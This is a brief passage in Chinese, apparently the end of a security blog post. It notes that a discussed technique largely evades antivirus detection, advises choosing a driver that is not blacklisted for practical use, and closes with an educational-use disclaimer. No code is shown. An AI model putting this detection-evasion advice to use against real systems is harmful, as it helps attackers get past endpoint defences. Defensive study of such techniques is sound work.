正如检测部分所展示的，该技术本身几乎不会被大多数杀毒引擎检测到，但驱动程序则另当别论——选择一个未被列入黑名单的驱动程序是实际应用的关键。  
  
---  
> 免责声明：本博客文章仅用于教育和研究目的。提供的所有技术和代码示例旨在帮助防御者理解攻击手法并提高安全态势。请勿使用此信息访问或干扰您不拥有或没有明确测试权限的系统。未经授权的使用可能违反法律和道德准则。作者对因应用所讨论概念而导致的任何误用或损害不承担任何责任。  
  
  
  
